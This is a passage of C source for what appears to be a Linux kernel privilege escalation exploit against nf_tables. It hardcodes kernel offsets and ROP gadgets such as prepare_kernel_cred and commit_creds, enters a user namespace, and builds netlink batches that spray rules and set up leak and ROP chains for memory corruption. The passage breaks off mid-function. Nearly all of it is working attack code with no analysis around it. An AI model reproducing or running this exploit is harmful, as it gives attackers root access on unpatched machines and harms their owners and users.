// gcc -masm=intel ./exp.c ./nft_rules_get.c -o exp -lnftnl -lmnl -static
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <fcntl.h>
#include <linux/if_packet.h>
#include <netinet/in.h>
#include <sched.h>
#include <signal.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <time.h>
#include <unistd.h>

#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nfnetlink_queue.h>
#include <linux/netlink.h>

#include <libmnl/libmnl.h>
#include <libnftnl/chain.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/set.h>
#include <libnftnl/table.h>

#include "nft_rules_get.h"

#define NFT_PAYLOAD_OPS_OFF 0x132a2e0
#define NFT_META_GET_OPS_OFF 0x132a780
#define POP_RDI_RET 0x0923d3
// 0xffffffff8147fe64 : mov rdi, rax ; jne 0xffffffff8147fe51 ; xor eax, eax ; jmp 0xffffffff82003400
#define MOV_RDI_RAX_JNE_RET 0x47fe64
// 0xffffffff81059cf8 : test rdi, rdi ; jne 0xffffffff81059d02 ; jmp 0xffffffff82003400
#define TEST_RDI_RET 0x059cf8
#define NFT_DO_CHAIN_IPV4 0xa67c30
#define PREPARE_KERNEL_CRED 0x09a000
#define COMMIT_CREDS 0x099d60
#define DO_TASK_DEAD 0x0a6880
#define swapgs_restore_regs_and_return_to_usermode 0xe00f41

#define N1SUB_ADD 0xDEADBEE0
#define N1SUB_FREE 0xDEADBEE1
#define N1SUB_DOSUB 0xDEADBEE2
#define N_RULE_SPRAY 16
#define N_SUB_SPRAY 1
#define BASECHAIN(i, buf) snprintf(buf, sizeof(buf), "basechain%d", i)
#define LEAKCHAIN(i, buf) snprintf(buf, sizeof(buf), "leakchain%d", i)
#define ROPCHAIN(i, buf) snprintf(buf, sizeof(buf), "ropchain%d", i)

// {{{ udp server
struct child_proc {
  struct child_proc *next;
  pid_t pid;
};

static struct child_proc *children;

static void add_child(pid_t pid) {
  struct child_proc *child = malloc(sizeof *child);
  child->pid = pid;
  child->next = children;
  children = child;
}

static void kill_children(int sig) {
  // printf("[pid=%d] killing children!\n", getpid());

  struct child_proc *current_child = children;
  while (current_child) {
    kill(current_child->pid, SIGTERM);
    current_child = current_child->next;
  }

  exit(EXIT_SUCCESS);
}
pid_t setup_listener(char *ip_string, uint16_t port, int (*handler)(int, int),
                     int pipe_fd) {

  int err;

  int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

  if (s < 0) {
    perror("socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)");
    exit(EXIT_FAILURE);
  }

  int reuse_addr = 1;

  setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &reuse_addr, sizeof reuse_addr);

  struct sockaddr_in addr;
  inet_aton(ip_string, &addr.sin_addr);
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);

  err = bind(s, (struct sockaddr *)&addr, sizeof(addr));

  if (err < 0) {
    perror("bind");
    exit(EXIT_FAILURE);
  }

  printf("Started listener on [%s:%d] (udp)\n", ip_string, port);

  pid_t pid = fork();
  if (pid) {
    // parent process
    add_child(pid);
    return pid;
  }

  handler(s, pipe_fd);

  exit(EXIT_SUCCESS);
}

int stop_listener(pid_t pid) {

  if (kill(pid, SIGTERM)) {
    perror("kill");
    return -1;
  };

  struct child_proc *next_child = children;
  struct child_proc *current_child = NULL;

  while (next_child) {

    if (next_child->pid == pid) {

      struct child_proc **prev =
          current_child == NULL ? &children : &current_child;
      if (current_child == NULL) {
        prev = &children;
      } else {
        prev = &current_child;
      }

      (*prev)->next = next_child->next;
      break;
    }

    current_child = next_child;
    next_child = next_child->next;
  }

  return 0;
}
// }}}

// {{{ Logging
#define progress(it, count, fmt, ...)                                          \
  do {                                                                         \
    dprintf(STDOUT_FILENO, "%8.3f | " fmt "\r", elapsed_wall_time(), it,       \
            count, ##__VA_ARGS__);                                             \
    if ((it) == ((count)))                                                     \
      dprintf(STDOUT_FILENO, "\n");                                            \
  } while (0)
#define log(fmt, ...)                                                          \
  do {                                                                         \
    dprintf(STDOUT_FILENO, "%8.3f | " fmt "\n", elapsed_wall_time(),           \
            ##__VA_ARGS__);                                                    \
  } while (0)
#define die(fmt, ...)                                                          \
  do {                                                                         \
    dprintf(STDERR_FILENO, "[-] " fmt "\n", ##__VA_ARGS__);                    \
    exit(-1);                                                                  \
  } while (0)

static struct timespec startup_time;
__attribute__((constructor)) static void initialize_wall_time(void) {
  if (clock_gettime(CLOCK_MONOTONIC_RAW, &startup_time))
    die("Failed to get current time: %m");
}

static inline double elapsed_wall_time(void) {
  struct timespec time;
  if (clock_gettime(CLOCK_MONOTONIC_RAW, &time))
    die("Failed to get current time: %m");
  if (time.tv_nsec < startup_time.tv_nsec) {
    time.tv_nsec += 1000000000ul;
    time.tv_sec -= 1;
  }
  return (double)(time.tv_sec - startup_time.tv_sec) +
         (double)(time.tv_nsec - startup_time.tv_nsec) / 1000000000.0;
}
// }}}

// utils {{{
// get user stat
size_t user_cs, user_gs, user_ds, user_es, user_ss, user_rflags, user_rsp;
void get_user_stat() {
  __asm__(".intel_syntax noprefix\n"); // set intel syntax
  __asm__ volatile("mov user_cs, cs;\
		 mov user_ss, ss;\
		 mov user_gs, gs;\
		 mov user_ds, ds;\
		 mov user_es, es;\
		 mov user_rsp, rsp;\
		 pushf;\
		 pop user_rflags");
  printf("[+] got user stat\n");
}

void hexdump(void *data, size_t len, unsigned int n_columns) {

  uint8_t *bdata = data;

  for (int i = 0; i < len; ++i) {
    printf("%.2hhx ", bdata[i]);

    if ((i + 1) % n_columns == 0) {
      putchar('\n');
    }
  }
}

void unshare_setup(uid_t uid, gid_t gid) {
  int temp;
  char edit[0x100];

  unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

  temp = open("/proc/self/setgroups", O_WRONLY);
  write(temp, "deny", strlen("deny"));
  close(temp);

  temp = open("/proc/self/uid_map", O_WRONLY);
  snprintf(edit, sizeof(edit), "0 %d 1", uid);
  write(temp, edit, strlen(edit));
  close(temp);

  temp = open("/proc/self/gid_map", O_WRONLY);
  snprintf(edit, sizeof(edit), "0 %d 1", gid);
  write(temp, edit, strlen(edit));
  close(temp);

  return;
}
// }}}

// Netlink helper {{{
// Netlink attributes
#define U32_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint32_t))
#define U64_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint64_t))
#define S8_NLA_SIZE (sizeof(struct nlattr) + 8)
#define NLA_BIN_SIZE(x) (sizeof(struct nlattr) + x)
#define NLA_ATTR(attr) ((void *)attr + NLA_HDRLEN)
#define NFT_NEWTABLE_MSG_SIZE NLMSG_SPACE(sizeof(struct nfgenmsg) + S8_NLA_SIZE)
#define NFT_NEWCHAIN_MSG_SIZE                                                  \
  NLMSG_SPACE(sizeof(struct nfgenmsg) + 2 * S8_NLA_SIZE)
const uint8_t zerobuf[0x1000] = {0};
const uint8_t nonzerobuf[0x10] = "chujchujchujchuj";

// set_nested_attr(): Prepare a nested netlink attribute
struct nlattr *set_nested_attr(struct nlattr *attr, uint16_t type,
                               uint16_t data_len) {
  attr->nla_type = type;
  attr->nla_len = NLA_ALIGN(data_len + sizeof(struct nlattr));
  return (void *)attr + sizeof(struct nlattr);
}

// set_u32_attr(): Prepare an integer netlink attribute
struct nlattr *set_u32_attr(struct nlattr *attr, uint16_t type,
                            uint32_t value) {
  attr->nla_type = type;
  attr->nla_len = U32_NLA_SIZE;
  *(uint32_t *)NLA_ATTR(attr) = htonl(value);

  return (void *)attr + U32_NLA_SIZE;
}

// set_u64_attr(): Prepare a 64 bits integer netlink attribute
struct nlattr *set_u64_attr(struct nlattr *attr, uint16_t type,
                            uint64_t value) {
  attr->nla_type = type;
  attr->nla_len = U64_NLA_SIZE;
  *(uint64_t *)NLA_ATTR(attr) = htobe64(value);

  return (void *)attr + U64_NLA_SIZE;
}

// set_str8_attr(): Prepare a 8 bytes long string netlink attribute
// @name: Buffer to copy into the attribute
struct nlattr *set_str8_attr(struct nlattr *attr, uint16_t type,
                             const char name[8]) {
  attr->nla_type = type;
  attr->nla_len = S8_NLA_SIZE;
  memcpy(NLA_ATTR(attr), name, 8);

  return (void *)attr + S8_NLA_SIZE;
}

/**
 * set_binary_attr(): Prepare a byte array netlink attribute
 * @attr: Attribute to fill
 * @type: Type of the attribute
 * @buffer: Buffer with data to send
 * @buffer_size: Size of the previous buffer
 */
struct nlattr *set_binary_attr(struct nlattr *attr, uint16_t type,
                               uint8_t *buffer, uint64_t buffer_size) {
  attr->nla_type = type;
  attr->nla_len = NLA_BIN_SIZE(buffer_size);

  memcpy(NLA_ATTR(attr), buffer, buffer_size);

  return (void *)attr + NLA_ALIGN(NLA_BIN_SIZE(buffer_size));
}

struct nlmsghdr *make_bacth_begin_nlmsghdr() {
  struct nlmsghdr *nlh =
      (struct nlmsghdr *)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
  if (nlh == NULL) {
    die("malloc");
  }
  struct nfgenmsg *nfgm = NLMSG_DATA(nlh);
  nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
  nlh->nlmsg_pid = getpid();
  nlh->nlmsg_seq = time(NULL);
  nlh->nlmsg_flags = 0;
  nlh->nlmsg_type = NFNL_MSG_BATCH_BEGIN;

  nfgm->res_id = NFNL_SUBSYS_NFTABLES;

  return nlh;
}

struct nlmsghdr *make_bacth_end_nlmsghdr() {
  struct nlmsghdr *nlh =
      (struct nlmsghdr *)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
  memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
  nlh->nlmsg_flags = NLM_F_REQUEST;
  nlh->nlmsg_seq = 0;
  nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
  nlh->nlmsg_pid = getpid();
  nlh->nlmsg_type = NFNL_MSG_BATCH_END;

  return nlh;
}
// }}}

void nft_create_table(int nlsock, const char *name) {
  struct nlmsghdr *nlh_batch_begin;
  struct nlmsghdr *nlh_payload;
  struct nlmsghdr *nlh_batch_end;
  struct nfgenmsg *nfgm;
  struct nlattr *nla;
  struct iovec iov[3];
  struct msghdr msg;
  struct sockaddr_nl dest_nl;
  int seq, nbytes;

  memset(&dest_nl, 0, sizeof(dest_nl));
  dest_nl.nl_family = AF_NETLINK;
  memset(&msg, 0, sizeof(msg));

  nlh_batch_begin = make_bacth_begin_nlmsghdr();
  seq = nlh_batch_begin->nlmsg_seq;
  nlh_payload = (struct nlmsghdr *)malloc(NFT_NEWTABLE_MSG_SIZE);
  if (nlh_payload == NULL) {
    die("malloc()");
  }
  nlh_payload->nlmsg_flags = NLM_F_REQUEST;
  nlh_payload->nlmsg_len = NFT_NEWTABLE_MSG_SIZE;
  nlh_payload->nlmsg_pid = getpid();
  nlh_payload->nlmsg_seq = ++seq;
  nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;

  nfgm = NLMSG_DATA(nlh_payload);
  nfgm->nfgen_family = NFPROTO_IPV4;

  nla = (void *)nlh_payload + NLMSG_SPACE(sizeof(struct nfgenmsg));
  set_str8_attr(nla, NFTA_TABLE_NAME, name);

  nlh_batch_end = make_bacth_end_nlmsghdr();

  memset(iov, 0, sizeof(iov));
  iov[0].iov_len = nlh_batch_begin->nlmsg_len;
  iov[0].iov_base = nlh_batch_begin;
  iov[1].iov_len = nlh_payload->nlmsg_len;
  iov[1].iov_base = nlh_payload;
  iov[2].iov_len = nlh_batch_end->nlmsg_len;
  iov[2].iov_base = nlh_batch_end;

  msg.msg_name = &dest_nl;
  msg.msg_namelen = sizeof(dest_nl);
  msg.msg_iov = iov;
  msg.msg_iovlen = 3;
  if ((nbytes = sendmsg(nlsock, &msg, 0)) <= 0) {
    die("sendmsg(create table)");
  }

  free(nlh_batch_begin);
  free(nlh_payload);
  free(nlh_batch_end);
}

void nft_create_chain(int nlsock, const char *table_name,
                      const char *chain_name) {
  struct nlmsghdr *nlh_batch_begin;
  struct nlmsghdr *nlh_payload;
  struct nlmsghdr *nlh_batch_end;
  struct nfgenmsg *nfgm;
  struct nlattr *nla;
  struct iovec iov[3];
  struct msghdr msg;
  struct sockaddr_nl dest_nl;
  int seq, nbytes;

  memset(&dest_nl, 0, sizeof(dest_nl));
  dest_nl.nl_family = AF_NETLINK;
  memset(&msg, 0, sizeof(msg));

  nlh_batch_begin = make_bacth_begin_nlmsghdr();
  seq = nlh_batch_begin->nlmsg_seq;
  nlh_payload = (struct nlmsghdr *)malloc(NFT_NEWCHAIN_MSG_SIZE);
  if (nlh_payload == NULL) {
    die("malloc()");
  }
  nlh_payload->nlmsg_flags = NLM_F_REQUEST;
  nlh_payload->nlmsg_len = NFT_NEWCHAIN_MSG_SIZE;
  nlh_payload->nlmsg_pid = getpid();
  nlh_payload->nlmsg_seq = ++seq;
  nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWCHAIN;

  nfgm = NLMSG_DATA(nlh_payload);
  nfgm->nfgen_family = NFPROTO_IPV4;

  nla = (void *)nlh_payload + NLMSG_SPACE(sizeof(struct nfgenmsg));
  nla = set_str8_attr(nla, NFTA_CHAIN_TABLE, table_name);
  nla = set_str8_attr(nla, NFTA_CHAIN_NAME, chain_name);

  nlh_batch_end = make_bacth_end_nlmsghdr();

  memset(iov, 0, sizeof(iov));
  iov[0].iov_len = nlh_batch_begin->nlmsg_len;
  iov[0].iov_base = nlh_batch_begin;
  iov[1].iov_len = nlh_payload->nlmsg_len;
  iov[1].iov_base = nlh_payload;
  iov[2].iov_len = nlh_batch_end->nlmsg_len;
  iov[2].iov_base = nlh_batch_end;

  msg.msg_name = &dest_nl;
  msg.msg_namelen = sizeof(dest_nl);
  msg.msg_iov = iov;
  msg.msg_iovlen = 3;
  if ((nbytes = sendmsg(nlsock, &msg, 0)) <= 0) {
    die("sendmsg(create chain)");
  }

  free(nlh_batch_begin);
  free(nlh_payload);
  free(nlh_batch_end);
}

#define mnl_batch_limit (1024 * 1024)
char mnl_batch_buffer[2 * mnl_batch_limit];

static void create_table(struct mnl_nlmsg_batch *batch, uint32_t seq,
                         char *table_name) {
  struct nftnl_table *table = nftnl_table_alloc();
  if (table == NULL) {
    die("nftnl_table_alloc()");
  }

  nftnl_table_set_u32(table, NFTNL_TABLE_FAMILY, NFPROTO_IPV4);
  nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);

  struct nlmsghdr *nlh = nftnl_table_nlmsg_build_hdr(
      mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, NFPROTO_IPV4,
      NLM_F_CREATE | NLM_F_ACK, seq);
  nftnl_table_nlmsg_build_payload(nlh, table);
  mnl_nlmsg_batch_next(batch);

  nftnl_table_free(table);
}

struct unft_base_chain_param {
  uint32_t hook_num;
  uint32_t prio;
  const char *dev;
};

static void create_chain(struct mnl_nlmsg_batch *batch, uint32_t seq,
                         char *table_name, char *chain_name,
                         struct unft_base_chain_param *param) {
  struct nftnl_chain *chain = nftnl_chain_alloc();
  if (chain == NULL) {
    die("Cannot into nftnl_chain_alloc()");
  }

  nftnl_chain_set_u32(chain, NFTNL_CHAIN_FAMILY, NFPROTO_IPV4);
  nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, table_name);
  nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, chain_name);

  if (param != NULL) {
    nftnl_chain_set_u32(chain, NFTNL_CHAIN_HOOKNUM, param->hook_num);
    nftnl_chain_set_u32(chain, NFTNL_CHAIN_PRIO, param->prio);
    // nftnl_chain_set_str(chain, NFTNL_CHAIN_DEV, param->dev);
  }

  struct nlmsghdr *nlh = nftnl_chain_nlmsg_build_hdr(
      mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, NFPROTO_IPV4,
      NLM_F_CREATE | NLM_F_ACK, seq);
  nftnl_chain_nlmsg_build_payload(nlh, chain);
  mnl_nlmsg_batch_next(batch);

  nftnl_chain_free(chain);
}

static void prepare_nft(struct mnl_socket *nl) {
  uint32_t portid, seq;
  int ret;

  seq = time(NULL);

  struct mnl_nlmsg_batch *batch =
      mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

  nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  // table for spray
  create_table(batch, seq++, "n1subtbl");
  for (int i = 0; i < N_RULE_SPRAY; i++) {
    char name_buf[0x10];
    LEAKCHAIN(i, name_buf);
    create_chain(batch, seq++, "n1subtbl", name_buf, NULL);
    ROPCHAIN(i, name_buf);
    create_chain(batch, seq++, "n1subtbl", name_buf, NULL);
  }

  for (int i = 0; i < 2; i++) {
    char name_buf[0x10];
    BASECHAIN(i, name_buf);
    struct unft_base_chain_param bp = {
        .hook_num = NF_INET_LOCAL_OUT, .prio = 10, .dev = "lo"};
    create_chain(batch, seq++, "n1subtbl", name_buf, &bp);
  }

  nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  portid = mnl_socket_get_portid(nl);

  if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                        mnl_nlmsg_batch_size(batch)) < 0) {
    die("mnl_socket_sendto()");
  }

  mnl_nlmsg_batch_stop(batch);
}

// {{{ nft_create_base_rule
void nft_create_base_rule(struct mnl_socket *nl, const char *table_name,
                          const char *chain_name, const char *target_chain,
                          uint32_t rule_id) {
  uint32_t portid, seq;
  struct mnl_nlmsg_batch *batch;
  struct nlmsghdr *nlh;
  int ret;
  char exploit_set_name[0x100];
  char *udata_buf[0x1000];
  struct nftnl_rule *rule;
  struct nftnl_expr *meta_expr, *imm_expr;

  seq = time(NULL);
  batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

  nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  rule = nftnl_rule_alloc();
  if (rule == NULL) {
    die("nftnl_rule_alloc");
  }

  nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
  nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, table_name);
  nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);

  imm_expr = nftnl_expr_alloc("immediate");
  if (imm_expr == NULL) {
    die("nftnl_expr_alloc");
  }
  int reg32_00 = 0;
  nftnl_expr_set_u32(imm_expr, NFTNL_EXPR_IMM_DREG, NFT_REG32_00);
  nftnl_expr_set_data(imm_expr, NFTNL_EXPR_IMM_DATA, &reg32_00,
                      sizeof(reg32_00));
  nftnl_rule_add_expr(rule, imm_expr);

  meta_expr = nftnl_expr_alloc("meta");
  if (meta_expr == NULL) {
    die("nftnl_expr_alloc");
  }
  nftnl_expr_set_u32(meta_expr, NFTNL_EXPR_META_KEY, NFT_META_NFTRACE);
  nftnl_expr_set_u32(meta_expr, NFTNL_EXPR_META_SREG, NFT_REG32_00);
  nftnl_rule_add_expr(rule, meta_expr);

  imm_expr = nftnl_expr_alloc("immediate");
  if (imm_expr == NULL) {
    die("nftnl_expr_alloc");
  }
  nftnl_expr_set_u32(imm_expr, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
  nftnl_expr_set_str(imm_expr, NFTNL_EXPR_IMM_CHAIN, target_chain);
  nftnl_expr_set_u32(imm_expr, NFTNL_EXPR_IMM_VERDICT, NFT_GOTO);
  nftnl_rule_add_expr(rule, imm_expr);

  imm_expr = nftnl_expr_alloc("immediate");
  if (imm_expr == NULL) {
    die("nftnl_expr_alloc");
  }
  nftnl_expr_set_u32(imm_expr, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
  // nftnl_expr_set_str(imm_expr, NFTNL_EXPR_IMM_CHAIN, target_chain);
  nftnl_expr_set_u32(imm_expr, NFTNL_EXPR_IMM_VERDICT, NFT_RETURN);
  nftnl_rule_add_expr(rule, imm_expr);

  nlh = nftnl_rule_nlmsg_build_hdr(
      mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, NFPROTO_IPV4,
      NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_rule_nlmsg_build_payload(nlh, rule);
  mnl_nlmsg_batch_next(batch);

  nftnl_rule_free(rule);

  nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                        mnl_nlmsg_batch_size(batch)) < 0) {
    die("Cannot into mnl_socket_sendto()");
  }

  mnl_nlmsg_batch_stop(batch);
}
// }}}

// {{{ nft_create_rop_base_rule
void nft_create_rop_base_rule(struct mnl_socket *nl, const char *table_name,
                              const char *chain_name, const char *target_chain,
                              const void *buf_32byte) {
  uint32_t portid, seq;
  struct mnl_nlmsg_batch *batch;
  struct nlmsghdr *nlh;
  int ret;
  char exploit_set_name[0x100];
  char *udata_buf[0x1000];
  struct nftnl_rule *rule;
  struct nftnl_expr *meta_expr, *imm_expr;

  seq = time(NULL);
  batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

  nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  rule = nftnl_rule_alloc();
  if (rule == NULL) {
    die("nftnl_rule_alloc");
  }

  nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
  nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, table_name);
  nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);

  imm_expr = nftnl_expr_alloc("immediate");
  if (imm_expr == NULL) {
    die("nftnl_expr_alloc");
  }
  int reg32_00 = 0;
  nftnl_expr_set_u32(imm_expr, NFTNL_EXPR_IMM_DREG, NFT_REG32_00);
  nftnl_expr_set_data(imm_expr, NFTNL_EXPR_IMM_DATA, &reg32_00,
                      sizeof(reg32_00));
  nftnl_rule_add_expr(rule, imm_expr);

  meta_expr = nftnl_expr_alloc("meta");
  if (meta_expr == NULL) {
    die("nftnl_expr_alloc");
  }
  nftnl_expr_set_u32(meta_expr, NFTNL_EXPR_META_KEY, NFT_META_NFTRACE);
  nftnl_expr_set_u32(meta_expr, NFTNL_EXPR_META_SREG, NFT_REG32_00);
  nftnl_rule_add_expr(rule, meta_expr);

  imm_expr = nftnl_expr_alloc("immediate");
  if (imm_expr == NULL) {
    die("nftnl_expr_alloc");
  }
  nftnl_expr_set_u32(imm_expr, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
  nftnl_expr_set_str(imm_expr, NFTNL_EXPR_IMM_CHAIN, target_chain);
  nftnl_expr_set_u32(imm_expr, NFTNL_EXPR_IMM_VERDICT, NFT_JUMP);
  nftnl_rule_add_expr(rule, imm_expr);

  // nft_range for the fake rule
  struct nftnl_expr *range_expr;
  range_expr = nftnl_expr_alloc("range");
  if (range_expr == NULL) {
    die("nftnl_expr_alloc");
  }
  nftnl_expr_set_u32(range_expr, NFTNL_EXPR_RANGE_SREG, NFT_REG32_08);
  nftnl_expr_set_u32(range_expr, NFTNL_EXPR_RANGE_OP, NFT_RANGE_EQ);
  nftnl_expr_set(range_expr, NFTNL_EXPR_RANGE_FROM_DATA, buf_32byte, 16);
  nftnl_expr_set(range_expr, NFTNL_EXPR_RANGE_TO_DATA, (char *)buf_32byte + 16,
                 16);
  nftnl_rule_add_expr(rule, range_expr);

  // directly return
  imm_expr = nftnl_expr_alloc("immediate");
  if (imm_expr == NULL) {
    die("nftnl_expr_alloc");
  }
  nftnl_expr_set_u32(imm_expr, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
  // nftnl_expr_set_str(imm_expr, NFTNL_EXPR_IMM_CHAIN, target_chain);
  nftnl_expr_set_u32(imm_expr, NFTNL_EXPR_IMM_VERDICT, NFT_RETURN);
  nftnl_rule_add_expr(rule, imm_expr);

  // struct nftnl_expr *pad_meta_rule;
  // // create tail padding meta exprs, make the rule at least in kmalloc-1k
  // for (int i = 0; i < 1024 / 16; i++) {
  //   pad_meta_rule = nftnl_expr_alloc("meta");
  //   if (pad_meta_rule == NULL) {
  //     die("nftnl_expr_alloc");
  //   }
  //   nftnl_expr_set_u32(pad_meta_rule, NFTNL_EXPR_META_KEY, NFT_META_PKTTYPE);
  //   nftnl_expr_set_u32(pad_meta_rule, NFTNL_EXPR_META_DREG, NFT_REG_1);
  //   nftnl_rule_add_expr(rule, pad_meta_rule);
  // }

  nlh = nftnl_rule_nlmsg_build_hdr(
      mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, NFPROTO_IPV4,
      NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_rule_nlmsg_build_payload(nlh, rule);
  mnl_nlmsg_batch_next(batch);

  nftnl_rule_free(rule);

  nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                        mnl_nlmsg_batch_size(batch)) < 0) {
    die("Cannot into mnl_socket_sendto()");
  }

  mnl_nlmsg_batch_stop(batch);
}
// }}}

// {{{ nft_create_rop_base_padding_rule
// add 1024 / 16 meta expr
void nft_create_rop_base_padding_rule(struct mnl_socket *nl,
                                      const char *table_name,
                                      const char *chain_name) {
  uint32_t portid, seq;
  struct mnl_nlmsg_batch *batch;
  struct nlmsghdr *nlh;
  int ret;
  char exploit_set_name[0x100];
  char *udata_buf[0x1000];
  struct nftnl_rule *rule;
  struct nftnl_expr *meta_expr, *imm_expr;

  seq = time(NULL);
  batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

  nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  rule = nftnl_rule_alloc();
  if (rule == NULL) {
    die("nftnl_rule_alloc");
  }

  nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
  nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, table_name);
  nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);

  struct nftnl_expr *pad_meta_rule;
  // create padding meta exprs, make the rule at least in kmalloc-1k
  for (int i = 0; i < 1024 / 16; i++) {
    pad_meta_rule = nftnl_expr_alloc("meta");
    if (pad_meta_rule == NULL) {
      die("nftnl_expr_alloc");
    }
    nftnl_expr_set_u32(pad_meta_rule, NFTNL_EXPR_META_KEY, NFT_META_PKTTYPE);
    nftnl_expr_set_u32(pad_meta_rule, NFTNL_EXPR_META_DREG, NFT_REG_1);
    nftnl_rule_add_expr(rule, pad_meta_rule);
  }

  nlh = nftnl_rule_nlmsg_build_hdr(
      mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, NFPROTO_IPV4,
      NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_rule_nlmsg_build_payload(nlh, rule);
  mnl_nlmsg_batch_next(batch);

  nftnl_rule_free(rule);

  nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                        mnl_nlmsg_batch_size(batch)) < 0) {
    die("Cannot into mnl_socket_sendto()");
  }

  mnl_nlmsg_batch_stop(batch);
}
// }}}

// {{{ nft_create_leak_append_rule
// append a rule to rebuild the chain->blob_gen_0, thus make the corrupt active
void nft_create_append_rule(struct mnl_socket *nl, const char *table_name,
                            const char *chain_name) {
  uint32_t portid, seq;
  struct mnl_nlmsg_batch *batch;
  struct nlmsghdr *nlh;
  int ret;
  char exploit_set_name[0x100];
  char *udata_buf[0x1000];
  struct nftnl_rule *rule;
  struct nftnl_expr *imm_expr;
  size_t userdata_len;

  seq = time(NULL);
  batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

  nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  rule = nftnl_rule_alloc();
  if (rule == NULL) {
    die("nftnl_rule_alloc");
  }

  nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
  nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, table_name);
  nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);

  imm_expr = nftnl_expr_alloc("immediate");
  if (imm_expr == NULL) {
    die("nftnl_expr_alloc");
  }
  int reg32_00 = 1;
  nftnl_expr_set_u32(imm_expr, NFTNL_EXPR_IMM_DREG, NFT_REG32_00);
  nftnl_expr_set_data(imm_expr, NFTNL_EXPR_IMM_DATA, &reg32_00,
                      sizeof(reg32_00));
  nftnl_rule_add_expr(rule, imm_expr);

  nlh = nftnl_rule_nlmsg_build_hdr(
      mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, NFPROTO_IPV4,
      NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK, seq++);
  nftnl_rule_nlmsg_build_payload(nlh, rule);
  mnl_nlmsg_batch_next(batch);

  nftnl_rule_free(rule);

  nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
  mnl_nlmsg_batch_next(batch);

  if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                        mnl_nlmsg_batch_size(batch)) < 0) {
    die("Cannot into mnl_socket_sendto()");
  }

  mnl_nlmsg_batch_stop(batch);
}

// }}}

// {{{ nft_create_leak_rule
void nft_create_leak_rule(struct mnl_socket *nl, const char *table_name,
